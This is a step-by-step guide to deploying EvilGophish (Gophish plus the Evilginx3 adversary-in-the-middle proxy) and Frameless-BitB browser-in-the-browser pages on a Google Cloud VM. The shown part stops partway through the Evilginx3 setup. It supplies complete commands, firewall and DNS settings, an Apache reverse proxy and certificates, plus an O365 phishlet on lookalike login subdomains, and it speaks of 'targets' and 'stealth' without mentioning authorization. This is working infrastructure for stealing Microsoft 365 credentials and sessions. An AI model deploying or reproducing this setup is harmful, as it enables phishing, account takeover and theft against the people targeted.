# EvilGophish + Frameless-BitB: Complete GCP Deployment Guide

## Step-by-Step Setup from Zero to Production

**This guide assumes you have nothing set up yet. Every single step is documented.**

---

## Table of Contents

1. [GCP Account Setup](#1-gcp-account-setup)
2. [Create GCP Project](#2-create-gcp-project)
3. [Create VM Instance](#3-create-vm-instance)
4. [Configure Firewall Rules](#4-configure-firewall-rules)
5. [Connect to VM via SSH](#5-connect-to-vm-via-ssh)
6. [Initial Server Configuration](#6-initial-server-configuration)
7. [Domain and DNS Setup](#7-domain-and-dns-setup)
8. [Install System Dependencies](#8-install-system-dependencies)
9. [Install Go Language](#9-install-go-language)
10. [Clone and Build EvilGophish](#10-clone-and-build-evilgophish)
11. [Clone and Configure Frameless-BitB](#11-clone-and-configure-frameless-bitb)
12. [Configure Apache with BitB](#12-configure-apache-with-bitb)
13. [Generate SSL Certificates](#13-generate-ssl-certificates)
14. [Configure Evilginx3](#14-configure-evilginx3)
15. [Configure Gophish](#15-configure-gophish)
16. [Create Systemd Services](#16-create-systemd-services)
17. [Start and Test Services](#17-start-and-test-services)
18. [Access Dashboards](#18-access-dashboards)
19. [Create Your First Campaign](#19-create-your-first-campaign)
20. [Troubleshooting](#20-troubleshooting)

---

## 1. GCP Account Setup

### 1.1 Create Google Cloud Account

**If you don't have a GCP account:**

1. Open your web browser
2. Navigate to: `https://cloud.google.com`
3. Click **"Get started for free"** button (top right)
4. Sign in with your Google account (or create one)
5. Fill in the required information:
   - Country
   - Account type (Individual or Business)
   - Name and address
   - Phone number for verification
6. Enter payment method (credit card required, but won't be charged for free tier)
7. Complete phone verification
8. Accept terms and conditions
9. Click **"Start my free trial"**

**You receive:**
- $300 free credit for 90 days
- Access to free tier products

### 1.2 Access Google Cloud Console

1. Navigate to: `https://console.cloud.google.com`
2. You should see the Cloud Console dashboard
3. If prompted, select your country and agree to terms

---

## 2. Create GCP Project

### 2.1 Create New Project

1. In the Cloud Console, look at the top navigation bar
2. Click on the project dropdown (shows "Select a project" or your current project name)
3. In the popup window, click **"NEW PROJECT"** (top right)
4. Fill in project details:
   - **Project name**: `evilgophish-prod` (or your preferred name)
   - **Project ID**: Auto-generated (you can customize it)
   - **Organization**: Select if applicable, or leave as "No organization"
   - **Location**: Select if applicable
5. Click **"CREATE"**
6. Wait 30-60 seconds for project creation

### 2.2 Select the Project

1. Click the project dropdown again
2. Find your new project `evilgophish-prod`
3. Click on it to select it
4. Verify the project name appears in the top navigation bar

### 2.3 Enable Required APIs

1. In the left sidebar, click **"APIs & Services"** → **"Library"**
2. Search for and enable each of these APIs:

**Compute Engine API:**
1. Search: `Compute Engine API`
2. Click on "Compute Engine API"
3. Click **"ENABLE"** button
4. Wait for it to enable (may take 1-2 minutes)

**Cloud DNS API (if using GCP for DNS):**
1. Search: `Cloud DNS API`
2. Click on "Cloud DNS API"
3. Click **"ENABLE"** button

---

## 3. Create VM Instance

### 3.1 Navigate to Compute Engine

1. In the left sidebar, click **"Compute Engine"** → **"VM instances"**
2. If this is your first time, click **"ENABLE"** and wait for Compute Engine to initialize (takes 1-2 minutes)
3. Once ready, click **"CREATE INSTANCE"**

### 3.2 Configure VM Instance

Fill in each field exactly as follows:

#### Basic Configuration

**Name:**
```
evilgophish-server
```

**Region and Zone:**
- Region: `us-central1` (or closest to your targets)
- Zone: `us-central1-a`

**Machine Configuration:**

1. Click **"GENERAL-PURPOSE"** tab
2. Series: `E2`
3. Machine type: `e2-medium` (2 vCPU, 4 GB memory)
   - This provides adequate resources for the setup
   - You can upgrade later if needed

#### Boot Disk Configuration

1. Click **"CHANGE"** button under "Boot disk"
2. Configure as follows:
   - **Operating system**: `Ubuntu`
   - **Version**: `Ubuntu 22.04 LTS` (x86/64, amd64)
   - **Boot disk type**: `Balanced persistent disk`
   - **Size (GB)**: `30`
3. Click **"SELECT"**

#### Identity and API Access

- Service account: `Compute Engine default service account`
- Access scopes: `Allow default access`

#### Firewall

Check both boxes:
- [x] **Allow HTTP traffic**
- [x] **Allow HTTPS traffic**

### 3.3 Advanced Options (Networking)

1. Click **"Advanced options"** to expand
2. Click **"Networking"** to expand
3. Under **"Network interfaces"**, click on `default`
4. Configure External IP:
   - External IPv4 address: Click dropdown → **"CREATE IP ADDRESS"**
   - Name: `evilgophish-ip`
   - Click **"RESERVE"**
5. Click **"Done"**

### 3.4 Create the Instance

1. Review all settings
2. Click **"CREATE"** at the bottom
3. Wait for the instance to be created (1-2 minutes)
4. Note the **External IP** address once created

**Record this information:**
```
Instance Name: evilgophish-server
Zone: us-central1-a
External IP: ___.___.___.___  (WRITE THIS DOWN)
Internal IP: 10.x.x.x
```

---

## 4. Configure Firewall Rules

### 4.1 Understanding Network Tags and Firewall Rules

**CRITICAL CONCEPT: What are Network Tags?**

Network tags are labels you attach to VMs that firewall rules use to determine which VMs they apply to.

**How it works:**
```
┌─────────────────────────────────────────────────────────────┐
│                    FIREWALL RULE                            │
│  Name: allow-dns                                            │
│  Ports: 53 (TCP/UDP)                                        │
│  Target: VMs with tag "evilgophish" ──┐                     │
└──────────────────────────────────────┼─────────────────────┘
                                       │
                  ┌────────────────────┘
                  │   TAG MATCHING
                  ▼
┌────────────────────────────────┐  ┌───────────────────────┐
│   VM: evilgophish-server       │  │  VM: other-server     │
│   Tags: [evilgophish]          │  │  Tags: []             │
│   Status: ✓ Rule APPLIES       │  │  Status: ✗ Rule SKIPS │
│   Port 53: OPEN                │  │  Port 53: BLOCKED     │
└────────────────────────────────┘  └───────────────────────┘
```

**Why do we need this?**
- GCP firewall rules can target ALL VMs or SPECIFIC VMs with matching tags
- By using tags, we only open port 53 (DNS) on our phishing server, not every VM in the project
- This is more secure than opening ports on all VMs

**What happens if you skip network tags?**
- The firewall rule exists but applies to NO VMs
- Port 53 will be BLOCKED
- Evilginx3 DNS server will FAIL
- Your phishing setup will NOT WORK

### 4.2 Navigate to Firewall

1. In the GCP Console top-left, click the **hamburger menu** (three horizontal lines)
2. Scroll down to **"VPC network"** section
3. Click **"Firewall"**
4. You'll see existing firewall rules like:
   - `default-allow-http`
   - `default-allow-https`
   - `default-allow-internal`
   - `default-allow-rdp`
   - `default-allow-ssh`

### 4.3 Create DNS Firewall Rule

**Why this rule is needed:**
- Evilginx3 runs its own DNS server on port 53 (both TCP and UDP)
- Without this rule, external clients cannot query your DNS server
- The default GCP firewall blocks all ports except those explicitly allowed

**Step-by-step creation:**

1. Click **"CREATE FIREWALL RULE"** button at the top
2. You'll see a form with many fields - fill them EXACTLY as follows:

#### Name and Description
```
Name: allow-dns
Description: Allow DNS traffic for Evilginx3 MITM proxy
```

**Why this name?** Descriptive and follows GCP naming convention.

#### Logs
```
Logs: Off (default)
```

**Note:** You can enable logs later for debugging if needed.

#### Network
```
Network: default
```

**Explanation:** This is the VPC network. Unless you created custom networks, use `default`.

#### Priority
```
Priority: 1000
```

**Explanation:** Lower numbers = higher priority. 1000 is default and works fine.

#### Direction of traffic
```
Direction: Ingress
```

**Explanation:** "Ingress" = incoming traffic TO your VM. This is what we want.

#### Action on match
```
Action: Allow
```

**Explanation:** When traffic matches this rule, ALLOW it through.

#### Targets
**THIS IS THE CRITICAL PART - READ CAREFULLY:**

```
Targets: Specified target tags
Target tags: evilgophish
```

**STEP BY STEP:**
1. Click the dropdown that says "All instances in the network"
2. Select **"Specified target tags"**
3. A text field appears labeled "Target tags"
4. Type: `evilgophish` (lowercase, no spaces)
5. Press Enter or click outside the field

**Visual confirmation:**
You should see a blue pill/bubble with the text "evilgophish" appear.

```
Target tags: [evilgophish]
             ↑ This blue bubble confirms the tag is set
```

**What this means:**
This firewall rule will ONLY apply to VMs that have the tag "evilgophish".
Right now, NO VMs have this tag, so the rule won't do anything yet.
We'll add the tag to our VM in the next section.

#### Source filter

```
Source IPv4 ranges: 0.0.0.0/0
```

**Explanation:**
- `0.0.0.0/0` means "any IP address on the internet"
- This allows DNS queries from anywhere
- This is necessary because we don't know where targets will be

**Security consideration:**
This is safe because:
1. Only port 53 is exposed
2. Evilginx3 has built-in protections
3. You can add IP restrictions later if needed

#### Source IPv6 ranges
```
Leave empty (default)
```

#### Protocols and ports
**VERY IMPORTANT - DNS requires BOTH TCP and UDP:**

1. Select radio button: **"Specified protocols and ports"**
2. You'll see checkboxes for different protocols
3. Check the box next to **"tcp"**
4. In the text field next to "tcp", type: `53`
5. Check the box next to **"udp"**
6. In the text field next to "udp", type: `53`

**It should look like:**
```
☑ tcp: 53
☑ udp: 53
☐ Other protocols
```

**Why both TCP and UDP?**
- UDP port 53: Standard DNS queries (most common)
- TCP port 53: Large DNS responses and zone transfers
- Evilginx3 uses BOTH protocols

#### Final Review

Before clicking "CREATE", verify these settings:

```
Name: allow-dns
Network: default
Priority: 1000
Direction: Ingress
Action: Allow
Targets: Specified target tags → evilgophish
Source filter: 0.0.0.0/0
Protocols: tcp:53, udp:53
```

#### Create the Rule

1. Scroll to the bottom
2. Click the blue **"CREATE"** button
3. Wait 5-10 seconds for creation

**Expected result:**
- You're redirected to the firewall rules list
- You see `allow-dns` in the list
- Status shows a green checkmark (✓)

### 4.4 Add Network Tag to VM Instance

**CRITICAL STEP: The firewall rule exists but doesn't apply to any VM yet!**

Now we need to "attach" the tag to our VM so the firewall rule applies.

#### Navigate to VM

1. Click the hamburger menu (top-left)
2. Go to **"Compute Engine"** → **"VM instances"**
3. You should see your `evilgophish-server` instance
4. Click on the instance NAME (not the checkbox, the actual name text)

**Expected:** You're now on the "VM instance details" page showing information about your VM.

#### Enter Edit Mode

1. Look at the top of the page
2. You'll see buttons: STOP, RESET, DELETE, EDIT
3. Click **"EDIT"** button

**Expected:**
- The page reloads in edit mode
- Most fields now have editable inputs
- There's a blue "SAVE" button at the bottom

**WARNING:** Don't change any settings except the network tags!

#### Locate Network Tags Field

1. Scroll down the page
2. Look for a section called **"Network tags"**
3. It's usually in the middle of the page, after "Network interfaces"

**Visual location:**
```
[... other fields ...]

Network interfaces
  nic0: default (subnet)
  External IP: 35.xxx.xxx.xxx

Network tags  ← THIS IS WHAT YOU'RE LOOKING FOR
  [empty text field]

[... more fields ...]
```

#### Add the Tag

**Current state:**
```
Network tags
  [                    ]  ← Empty field
```

**What to do:**

1. Click inside the "Network tags" text field
2. Type: `evilgophish` (all lowercase, no spaces, no special characters)
3. Press **ENTER** key or **TAB** key

**IMPORTANT:** You MUST press Enter/Tab after typing. If you just type and click away, the tag won't be saved.

**Expected result:**
```
Network tags
  [evilgophish] ×  ← Blue pill with the tag name
```

You should see a blue bubble/pill with "evilgophish" and a small "×" to remove it.

**Visual confirmation:**
```
╔═══════════════════════════════════════╗
║ Network tags                          ║
║ ┌───────────────┐                     ║
║ │ evilgophish × │                     ║
║ └───────────────┘                     ║
╚═══════════════════════════════════════╝
        ↑
    Blue bubble confirms tag is set
```

#### Save Changes

**CRITICAL:** You must save or changes are lost!

1. Scroll to the very bottom of the page
2. Look for the blue **"SAVE"** button
3. Click **"SAVE"**
4. Wait 10-20 seconds for the update

**Expected output:**
```
Updating evilgophish-server...
✓ VM instance updated successfully
```

**Page behavior:**
- You're redirected back to the VM instance details page (view mode)
- The page shows the VM is running
- Network tags section now shows: `evilgophish`

### 4.5 Verify Firewall Configuration

#### Method 1: Check VM Instance Details

1. On the VM instance details page
2. Scroll to **"Network tags"** section
3. Verify it shows: `evilgophish`

**What you should see:**
```
Network tags
  evilgophish
```

#### Method 2: Check Firewall Rules List

1. Go to **"VPC network"** → **"Firewall"**
2. Find the `allow-dns` rule in the list
3. Click on it to see details
4. Under "Targets", verify it shows: `Target tags: evilgophish`

#### Method 3: View Effective Firewall Rules on VM

This shows which firewall rules actually apply to your VM:

1. Go to **"Compute Engine"** → **"VM instances"**
2. Click on `evilgophish-server`
3. Click the **"DETAILS"** tab (if not already selected)
4. Scroll down to **"Network interfaces"**
5. Click **"View details"** or **"nic0"**
6. Look for **"Firewall and routes details"**
7. Click **"Firewall rules"**

**You should see these rules applying to your VM:**
```
✓ default-allow-ssh       tcp:22       (from GCP default)
✓ default-allow-http      tcp:80       (you checked this box)
✓ default-allow-https     tcp:443      (you checked this box)
✓ allow-dns               tcp:53,udp:53 (you created this)
```

#### Method 4: Test from Another Machine (Optional)

**Warning:** Only do this AFTER the server is fully configured.

From your local machine:
```bash
# Test if port 53 is reachable (after Evilginx3 is running)
nc -zv YOUR_GCP_EXTERNAL_IP 53

# Expected output:
Connection to YOUR_GCP_EXTERNAL_IP 53 port [tcp/domain] succeeded!
```

### 4.6 Summary of Firewall Configuration

**Your VM now has these firewall rules:**

| Rule Name | Ports | Protocol | Source | Purpose |
|-----------|-------|----------|--------|---------|
| `default-allow-ssh` | 22 | TCP | 0.0.0.0/0 | SSH access |
| `default-allow-http` | 80 | TCP | 0.0.0.0/0 | HTTP (redirects to HTTPS) |
| `default-allow-https` | 443 | TCP | 0.0.0.0/0 | HTTPS phishing traffic |
| `allow-dns` | 53 | TCP/UDP | 0.0.0.0/0 | DNS for Evilginx3 |

**Network tag on your VM:**
- `evilgophish` - Links the VM to the `allow-dns` firewall rule

**Why network tags matter:**
```
Without tag:
  Firewall rule exists → Applies to: NOTHING → Port 53: BLOCKED ✗

With tag "evilgophish":
  Firewall rule exists → Applies to: evilgophish-server → Port 53: OPEN ✓
```

**Troubleshooting: Tag not applying?**

If the firewall rule doesn't seem to work:

1. **Verify tag on VM:**
   ```
   Go to VM → Edit → Network tags shows "evilgophish"
   ```

2. **Verify tag on firewall rule:**
   ```
   Go to Firewall → allow-dns → Target tags shows "evilgophish"
   ```

3. **Check for typos:**
   - Tag is case-sensitive
   - Must be exact: `evilgophish` not `EvilGophish` or `evil-gophish`
   - Check for extra spaces

4. **Wait for propagation:**
   - Changes can take 10-30 seconds
   - Refresh the page and check again

5. **Re-save if needed:**
   - Go to VM → Edit
   - Remove tag (click the × on the blue bubble)
   - Add tag again: `evilgophish`
   - Press Enter
   - Click SAVE

---

## 5. Connect to VM via SSH

### 5.1 SSH via Browser (Easiest Method)

1. Go to **"Compute Engine"** → **"VM instances"**
2. Find your `evilgophish-server` instance
3. Under the **"Connect"** column, click **"SSH"**
4. A new browser window opens with terminal access
5. Wait for connection (10-20 seconds)

**You should see:**
```
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-1049-gcp x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

username@evilgophish-server:~$
```

### 5.2 Alternative: SSH via gcloud CLI

If you prefer using your local terminal:

**Install Google Cloud SDK (on your local machine):**

For macOS:
```bash
brew install google-cloud-sdk
```

For Ubuntu/Debian:
```bash
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -
sudo apt update && sudo apt install google-cloud-cli
```

**Initialize and authenticate:**
```bash
gcloud init
gcloud auth login
```

**Connect to VM:**
```bash
gcloud compute ssh evilgophish-server --zone=us-central1-a --project=evilgophish-prod
```

### 5.3 Verify Connection

Once connected, verify your environment:

```bash
# Check you're on the right machine
hostname
```
**Expected output:** `evilgophish-server`

```bash
# Check Ubuntu version
cat /etc/os-release | grep PRETTY_NAME
```
**Expected output:** `PRETTY_NAME="Ubuntu 22.04.3 LTS"`

```bash
# Check available disk space
df -h /
```
**Expected output:** Should show ~29G available

```bash
# Check memory
free -h
```
**Expected output:** Should show ~3.8G total

---

## 6. Initial Server Configuration

**All commands from here are run on your GCP VM.**

### 6.1 Switch to Root User

```bash
sudo -i
```

**Your prompt changes to:** `root@evilgophish-server:~#`

### 6.2 Update System Packages

```bash
apt update
```

**Expected output:** Lists of packages being fetched, ending with:
```
Reading package lists... Done
```

```bash
apt upgrade -y
```

**Expected output:** Shows packages being upgraded, may take 2-5 minutes.

### 6.3 Set Timezone

```bash
timedatectl set-timezone UTC
```

Verify:
```bash
date
```
**Expected output:** Current date/time in UTC

### 6.4 Set Hostname (Optional)

```bash
hostnamectl set-hostname evilgophish
```

### 6.5 Create Working Directory

```bash
mkdir -p /opt/security-testing
cd /opt/security-testing
pwd
```
**Expected output:** `/opt/security-testing`

---

## 7. Domain and DNS Setup

### 7.1 Domain Requirements

You need a domain name for this setup. Options:

1. **Buy a new domain** - Recommended for stealth
   - Providers: Namecheap, GoDaddy, Google Domains, Cloudflare
   - Cost: ~$10-15/year for .com

2. **Use existing domain** - Add subdomains

**For this guide, we'll use example:** `secure-portal.com`
**Replace this with YOUR actual domain throughout.**

### 7.2 Configure DNS Records

Log into your domain registrar's DNS management panel and create these records:

**A Records (Point to your GCP External IP):**

| Type | Name | Value | TTL |
|------|------|-------|-----|
| A | @ | YOUR_GCP_EXTERNAL_IP | 300 |
| A | accounts | YOUR_GCP_EXTERNAL_IP | 300 |
| A | login | YOUR_GCP_EXTERNAL_IP | 300 |
| A | auth | YOUR_GCP_EXTERNAL_IP | 300 |
| A | www | YOUR_GCP_EXTERNAL_IP | 300 |

**Example with IP 35.192.100.50:**

| Type | Name | Value | TTL |
|------|------|-------|-----|
| A | @ | 35.192.100.50 | 300 |
| A | accounts | 35.192.100.50 | 300 |
| A | login | 35.192.100.50 | 300 |
| A | auth | 35.192.100.50 | 300 |

### 7.3 Verify DNS Propagation

Wait 5-10 minutes, then verify from your GCP VM:

```bash
apt install -y dnsutils
```

```bash
dig +short accounts.secure-portal.com
```
**Expected output:** Your GCP External IP (e.g., `35.192.100.50`)

```bash
dig +short login.secure-portal.com
```
**Expected output:** Your GCP External IP

If you don't see your IP, DNS hasn't propagated yet. Wait and try again.

**Test from external DNS:**
```bash
dig +short accounts.secure-portal.com @8.8.8.8
```

---

## 8. Install System Dependencies

### 8.1 Install All Required Packages

Run this single command to install all dependencies:

```bash
apt install -y \
    build-essential \
    git \
    curl \
    wget \
    net-tools \
    dnsutils \
    openssl \
    certbot \
    python3-certbot-apache \
    apache2 \
    apache2-utils \
    sqlite3 \
    libsqlite3-dev \
    tmux \
    supervisor \
    jq \
    unzip \
    ufw \
    vim \
    htop
```

**This takes 2-5 minutes. Expected output ends with:**
```
Processing triggers for ...
```

### 8.2 Verify Installations

```bash
git --version
```
**Expected:** `git version 2.34.1`

```bash
apache2 -v
```
**Expected:** `Server version: Apache/2.4.52 (Ubuntu)`

```bash
sqlite3 --version
```
**Expected:** `3.37.2 ...`

```bash
openssl version
```
**Expected:** `OpenSSL 3.0.2 ...`

### 8.3 Enable Apache Modules

```bash
a2enmod proxy proxy_http ssl substitute rewrite headers env proxy_wstunnel
```

**Expected output:**
```
Enabling module proxy.
Enabling module proxy_http.
Enabling module ssl.
Enabling module substitute.
Enabling module rewrite.
Enabling module headers.
Enabling module env.
Enabling module proxy_wstunnel.
To activate the new configuration, you need to run:
  systemctl restart apache2
```

**Don't restart Apache yet - we'll do it after configuration.**

---

## 9. Install Go Language

### 9.1 Download Latest Go

```bash
cd /tmp
GO_VERSION=$(curl -s https://go.dev/VERSION?m=text | head -1)
echo "Installing Go version: $GO_VERSION"
```
**Expected output:** `Installing Go version: go1.21.5` (or similar)

```bash
wget -q "https://go.dev/dl/${GO_VERSION}.linux-amd64.tar.gz"
ls -lh ${GO_VERSION}.linux-amd64.tar.gz
```
**Expected output:** Shows file ~65MB

### 9.2 Install Go

```bash
# Remove any existing Go installation
rm -rf /usr/local/go

# Extract new installation
tar -C /usr/local -xzf ${GO_VERSION}.linux-amd64.tar.gz

# Verify extraction
ls /usr/local/go/bin/
```
**Expected output:** `go  gofmt`

### 9.3 Configure Go Environment

```bash
# Create environment file
cat > /etc/profile.d/go.sh << 'EOF'
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
EOF

# Load environment
source /etc/profile.d/go.sh

# Create symlink
ln -sf /usr/local/go/bin/go /usr/bin/go
```

### 9.4 Verify Go Installation

```bash
go version
```
**Expected output:** `go version go1.21.5 linux/amd64`

```bash
go env GOROOT
```
**Expected output:** `/usr/local/go`

```bash
go env GOPATH
```
**Expected output:** `/root/go`

---

## 10. Clone and Build EvilGophish

### 10.1 Clone Repository

```bash
cd /opt/security-testing
git clone https://github.com/theroseinc/evilgophish.git
cd evilgophish
```

**Expected output:**
```
Cloning into 'evilgophish'...
remote: Enumerating objects: ...
Receiving objects: 100% ...
Resolving deltas: 100% ...
```

### 10.2 Verify Clone

```bash
ls -la
```

**Expected output:**
```
total XX
drwxr-xr-x  X root root XXXX ... .
drwxr-xr-x  X root root XXXX ... ..
drwxr-xr-x  X root root XXXX ... .git
-rw-r--r--  1 root root XXXX ... CHANGELOG.md
-rw-r--r--  1 root root XXXX ... LICENSE
-rw-r--r--  1 root root XXXX ... README.md
drwxr-xr-x  X root root XXXX ... evilginx3
drwxr-xr-x  X root root XXXX ... gophish
drwxr-xr-x  X root root XXXX ... evilfeed
-rwxr-xr-x  1 root root XXXX ... setup.sh
```

### 10.3 Build Evilginx3

```bash
cd /opt/security-testing/evilgophish/evilginx3
go build -o evilginx3
```

**This takes 1-3 minutes. No output means success.**

Verify:
```bash
ls -lh evilginx3
```
**Expected output:** Shows `evilginx3` file, ~15-20MB

```bash
./evilginx3 -h
```
**Expected output:** Shows help text with available flags

### 10.4 Configure and Build Gophish

```bash
cd /opt/security-testing/evilgophish/gophish
```

**Create configuration file:**

```bash
cat > config.json << 'EOF'
{
    "admin_server": {
        "listen_url": "127.0.0.1:3333",
        "use_tls": true,
        "cert_path": "gophish_admin.crt",
        "key_path": "gophish_admin.key"
    },
    "phish_server": {
        "listen_url": "127.0.0.1:8080",
        "use_tls": true,
        "cert_path": "gophish_template.crt",
        "key_path": "gophish_template.key"
    },
    "feed_enabled": true,
    "db_name": "sqlite3",
    "db_path": "gophish.db",
    "migrations_prefix": "db/db_",
    "contact_address": "",
    "logging": {
        "filename": "gophish.log",
        "level": "info"
    }
}
EOF
```

**Verify configuration:**
```bash
cat config.json | jq .
```
**Expected output:** Pretty-printed JSON configuration

**Build Gophish:**
```bash
go build
```

**This takes 1-2 minutes. No output means success.**

Verify:
```bash
ls -lh gophish
```
**Expected output:** Shows `gophish` file, ~30MB

### 10.5 Build Evilfeed

```bash
cd /opt/security-testing/evilgophish/evilfeed
go build -o evilfeed
```

Verify:
```bash
ls -lh evilfeed
```
**Expected output:** Shows `evilfeed` file, ~7MB

---

## 11. Clone and Configure Frameless-BitB

### 11.1 Clone Repository

```bash
cd /opt/security-testing
git clone https://github.com/theroseinc/frameless-bitb.git
cd frameless-bitb
```

### 11.2 Verify Clone

```bash
ls -la
```

**Expected output:**
```
drwxr-xr-x ... apache-configs
drwxr-xr-x ... custom-subs
drwxr-xr-x ... pages
-rw-r--r-- ... O365.yaml
-rw-r--r-- ... openssl-local.cnf
-rw-r--r-- ... README.md
```

### 11.3 Update Domain in All Files

**IMPORTANT: Replace `secure-portal.com` with YOUR domain**

```bash
# Set your domain
export MY_DOMAIN="secure-portal.com"

# Replace in all configuration files
find /opt/security-testing/frameless-bitb -type f \( -name "*.conf" -o -name "*.html" -o -name "*.js" \) \
    -exec sed -i "s/fake\.com/${MY_DOMAIN}/g" {} \;

# Verify replacement
grep -r "${MY_DOMAIN}" /opt/security-testing/frameless-bitb --include="*.conf" | head -5
```

### 11.4 Copy BitB Pages to Web Root

```bash
# Create web directories
mkdir -p /var/www/bitb/{home,primary,secondary}

# Copy pages
cp -r /opt/security-testing/frameless-bitb/pages/home/* /var/www/bitb/home/
cp -r /opt/security-testing/frameless-bitb/pages/primary/* /var/www/bitb/primary/
cp -r /opt/security-testing/frameless-bitb/pages/secondary/* /var/www/bitb/secondary/

# Update domain in pages
find /var/www/bitb -type f -exec sed -i "s/fake\.com/${MY_DOMAIN}/g" {} \;

# Set permissions
chown -R www-data:www-data /var/www/bitb
chmod -R 755 /var/www/bitb

# Verify
ls -la /var/www/bitb/
```

**Expected output:**
```
drwxr-xr-x ... home
drwxr-xr-x ... primary
drwxr-xr-x ... secondary
```

### 11.5 Copy Custom Substitutions

```bash
# Create directory
mkdir -p /etc/apache2/custom-subs

# Copy substitution files
cp /opt/security-testing/frameless-bitb/custom-subs/* /etc/apache2/custom-subs/

# Update domain
sed -i "s/fake\.com/${MY_DOMAIN}/g" /etc/apache2/custom-subs/*

# Verify
ls -la /etc/apache2/custom-subs/
```

### 11.6 Copy O365 Phishlet

```bash
cp /opt/security-testing/frameless-bitb/O365.yaml \
   /opt/security-testing/evilgophish/evilginx3/phishlets/

ls /opt/security-testing/evilgophish/evilginx3/phishlets/
```

---

## 12. Configure Apache with BitB

### 12.1 Create SSL Directory

```bash
mkdir -p /etc/apache2/ssl
```

### 12.2 Generate Self-Signed Certificates (Temporary)

These are temporary certificates. We'll replace with Let's Encrypt later.

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/apache2/ssl/bitb.key \
    -out /etc/apache2/ssl/bitb.crt \
    -subj "/C=US/ST=California/L=SanFrancisco/O=Security/CN=${MY_DOMAIN}"
```

**Expected output:**
```
Generating a RSA private key
..+++++
writing new private key to '/etc/apache2/ssl/bitb.key'
```

Set permissions:
```bash
chmod 600 /etc/apache2/ssl/bitb.key
chmod 644 /etc/apache2/ssl/bitb.crt
```

### 12.3 Create Apache VirtualHost

```bash
cat > /etc/apache2/sites-available/bitb.conf << EOF
<VirtualHost *:443>
    ServerName accounts.${MY_DOMAIN}
    ServerAlias login.${MY_DOMAIN} auth.${MY_DOMAIN}

    # SSL Configuration (temporary self-signed)
    SSLEngine on
    SSLCertificateFile /etc/apache2/ssl/bitb.crt
    SSLCertificateKeyFile /etc/apache2/ssl/bitb.key

    # Proxy to Evilginx3
    ProxyPreserveHost On
    ProxyPass / https://127.0.0.1:8443/
    ProxyPassReverse / https://127.0.0.1:8443/

    # SSL Proxy settings
    SSLProxyEngine on
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off

    # Include BitB substitutions
    Include /etc/apache2/custom-subs/*.conf

    # Logging
    ErrorLog \${APACHE_LOG_DIR}/bitb-error.log
    CustomLog \${APACHE_LOG_DIR}/bitb-access.log combined
    LogLevel warn
</VirtualHost>

<VirtualHost *:80>
    ServerName accounts.${MY_DOMAIN}
    ServerAlias login.${MY_DOMAIN} auth.${MY_DOMAIN}

    # Redirect to HTTPS
    Redirect permanent / https://accounts.${MY_DOMAIN}/
</VirtualHost>
EOF
```

### 12.4 Enable Site

```bash
# Disable default site
a2dissite 000-default

# Enable BitB site
a2ensite bitb

# Test configuration
apache2ctl configtest
```

**Expected output:** `Syntax OK`

---

## 13. Generate SSL Certificates

### 13.1 Stop Apache Temporarily

```bash
systemctl stop apache2
```

### 13.2 Obtain Let's Encrypt Certificates

**Replace with YOUR email and domain:**

```bash
certbot certonly --standalone \
    -d accounts.${MY_DOMAIN} \
    -d login.${MY_DOMAIN} \
    -d auth.${MY_DOMAIN} \
    --non-interactive \
    --agree-tos \
    --email your-email@example.com
```

**Expected output:**
```
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Requesting a certificate for accounts.secure-portal.com and 2 more domains

Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/accounts.secure-portal.com/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/accounts.secure-portal.com/privkey.pem
```

### 13.3 Update Apache to Use Let's Encrypt Certs

```bash
# Determine certificate path
CERT_PATH="/etc/letsencrypt/live/accounts.${MY_DOMAIN}"

# Update Apache config
sed -i "s|/etc/apache2/ssl/bitb.crt|${CERT_PATH}/fullchain.pem|g" /etc/apache2/sites-available/bitb.conf
sed -i "s|/etc/apache2/ssl/bitb.key|${CERT_PATH}/privkey.pem|g" /etc/apache2/sites-available/bitb.conf

# Verify
grep -E "SSLCertificate" /etc/apache2/sites-available/bitb.conf
```

**Expected output:**
```
    SSLCertificateFile /etc/letsencrypt/live/accounts.secure-portal.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/accounts.secure-portal.com/privkey.pem
```

### 13.4 Setup Auto-Renewal

```bash
# Test renewal
certbot renew --dry-run

# Enable timer
systemctl enable certbot.timer
systemctl start certbot.timer
```

---

## 14. Configure Evilginx3

### 14.1 Configure DNS for Evilginx3 Takeover

Evilginx3 needs to control DNS for the phishing domain:

```bash
# Stop systemd-resolved
systemctl stop systemd-resolved
systemctl disable systemd-resolved

# Backup original files
cp /etc/resolv.conf /etc/resolv.conf.bak
cp /etc/hosts /etc/hosts.bak

# Configure resolv.conf
rm /etc/resolv.conf
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf

# Add local resolution for our domains
cat >> /etc/hosts << EOF

# EvilGophish phishing domains
127.0.0.1 accounts.${MY_DOMAIN}
127.0.0.1 login.${MY_DOMAIN}
127.0.0.1 auth.${MY_DOMAIN}
EOF

# Verify
cat /etc/hosts | tail -5
```

### 14.2 Create Evilginx3 Configuration Directory

```bash
mkdir -p /root/.evilginx
```

### 14.3 Test Evilginx3 Start

```bash
cd /opt/security-testing/evilgophish/evilginx3

# Start in developer mode to test
./evilginx3 -developer -g /opt/security-testing/evilgophish/gophish/gophish.db
```

**Expected output:** Evilginx3 banner and prompt `:`

**Configure in Evilginx3 console:**

Type these commands one by one:

```
: config domain secure-portal.com
```
**Response:** `domain set to: secure-portal.com`

```
: config ipv4 YOUR_GCP_EXTERNAL_IP
```
**Response:** `ipv4 set to: 35.192.100.50`

```
: blacklist noadd
```
**Response:** `blacklist mode set to: noadd`

```
: phishlets
```
**Response:** List of available phishlets

```
: phishlets hostname o365 accounts.secure-portal.com
```
**Response:** `hostname set for phishlet 'o365'`

```
